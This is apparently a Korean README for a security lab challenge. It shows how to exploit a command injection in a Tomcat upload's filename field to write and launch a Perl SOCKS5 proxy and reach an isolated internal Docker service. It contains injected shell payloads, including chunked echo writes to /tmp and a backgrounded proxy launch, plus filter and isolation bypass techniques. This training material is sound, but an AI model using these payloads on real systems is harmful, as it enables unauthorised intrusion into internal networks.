# SOCKS5 Proxy via Command Injection Challenge

이 프로젝트는 Command Injection 취약점을 이용하여 Perl로 작성된 SOCKS5 proxy 서버를 실행하고, 내부 네트워크의 서비스에 접근하는 보안 과제입니다.

## 환경 설명

### Docker Compose 환경
- **web**: Apache Tomcat 9 기반 웹 서버 (포트 8080)
- **internal_web**: Flask 기반 내부 검증 서버 (포트 5000)
- **네트워크**: Docker bridge 네트워크로 격리

### 제약 조건
1. **취약점 위치**: 파일 업로드 시 `multipart/form-data`의 `filename` 파라미터
2. **문자 필터링**: `filename`에서 `/`, `\` 문자 필터링
3. **길이 제한**: `filename` 50바이트 미만
4. **명령어 제한**: `perl`만 사용 가능 (base64, wget, curl, nc, python 없음)
5. **네트워크 제한**: 외부 네트워크 차단, 내부 Docker 네트워크만 허용
6. **권한 제한**: `tomcat_user` 권한 (non-root)
7. **웹셸 차단**: JSP 파일 실행 차단

## 공격 흐름

### 1. Command Injection 취약점 확인
```bash
# 파일 업로드 시 filename 파라미터에 명령어 삽입
filename: ';sleep 5;echo '
```

### 2. SOCKS5 Proxy 코드 생성
- Perl로 작성된 최소한의 SOCKS5 proxy 서버
- 127.0.0.1:1080에서 리스닝
- 내부 서비스(`internal_web:5000`)로 트래픽 전달

### 3. Command Injection을 통한 SOCKS5 실행 (Chunked 방식)
```bash
# 페이로드 구조 (여러 번의 요청으로 나누어 전송)
# 1단계: 파일 생성
filename: ';echo "#!/usr/bin/perl" > /tmp/socks.pl;echo '

# 2단계: 코드 조각들 추가
filename: ';echo "use IO::Socket::INET;" >> /tmp/socks.pl;echo '
filename: ';echo "$s=IO::Socket::INET->new..." >> /tmp/socks.pl;echo '
# ... (여러 조각으로 나누어 전송)

# 3단계: 실행
filename: ';chmod +x /tmp/socks.pl && /tmp/socks.pl &;echo '
```

### 4. SOCKS5 Proxy를 통한 내부 서비스 접근
```bash
# Host PC에서 실행
curl --socks5 127.0.0.1:1080 http://internal_web:5000/
```

## 사용 방법

### 1. 환경 실행
```bash
# Docker Compose로 환경 실행
docker-compose up -d

# 환경 확인
curl http://localhost:8080/
```

### 2. SOCKS5 Proxy 실행
```bash
# Python 스크립트로 자동 실행 (Chunked 방식)
python3 chunked_exploit.py

# 또는 기존 방식
python3 simple_exploit.py

# 또는 수동으로 페이로드 생성 및 실행
# (exploit.py 참조)
```

### 3. SOCKS5 Proxy 테스트
```bash
# 기본 테스트
curl --socks5 127.0.0.1:1080 http://internal_web:5000/

# 예상 결과
# Congratulation! You have successfully accessed the internal service through SOCKS5 proxy!
```

### 4. 다양한 프로토콜 지원 확인
```bash
# SSH 연결 (예시)
ssh -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' user@internal_web

# 데이터베이스 연결 (예시)
mysql -h internal_web -P 3306 --proxy-protocol=socks5://127.0.0.1:1080
```

## 파일 구조

```
bob-perl-tunnel-assignment/
├── socks.pl              # 완전한 SOCKS5 proxy 구현
├── socks_minimal.pl      # 최소한의 SOCKS5 proxy (Command Injection용)
├── chunked_exploit.py    # Chunked 방식 자동화 공격 스크립트 (권장)
├── simple_exploit.py     # 기존 자동화된 공격 스크립트
├── exploit.py           # 상세한 공격 스크립트
├── docker-compose.yml   # 환경 설정
├── Dockerfile          # 웹 서버 이미지
├── entrypoint.sh       # 컨테이너 시작 스크립트
└── README.md           # 이 파일
```

## 기술적 세부사항

### SOCKS5 Protocol 구현
- **버전**: SOCKS5 (RFC 1928)
- **인증**: No authentication required
- **명령**: CONNECT only
- **주소 타입**: IPv4, Domain name 지원

### Command Injection 우회 기법
- **Chunked 전송**: 긴 페이로드를 여러 조각으로 나누어 전송
- **파일 생성**: `echo` 명령어로 조각 단위로 파일 생성
- **명령어 체이닝**: `&&` 연산자 사용
- **백그라운드 실행**: `&` 연산자로 데몬화

### 네트워크 격리 우회
- **Bind Shell**: 외부 연결 대신 내부 포트 바인딩
- **Port Forwarding**: 로컬 포트를 내부 서비스로 포워딩
- **SOCKS5 Proxy**: 다양한 프로토콜 지원

## 보안 의의

이 과제는 다음과 같은 보안 개념을 다룹니다:

1. **Command Injection**: 사용자 입력 검증 부족
2. **Network Tunneling**: 격리된 네트워크 우회
3. **Privilege Escalation**: 제한된 권한에서의 기능 확장
4. **Protocol Implementation**: SOCKS5 프로토콜 구현
5. **Defense Evasion**: 필터링 및 제약 조건 우회

## 주의사항

- 이 코드는 교육 목적으로만 사용하세요
- 실제 시스템에서 무단 사용 시 법적 문제가 발생할 수 있습니다
- 보안 연구 및 테스트 환경에서만 실행하세요
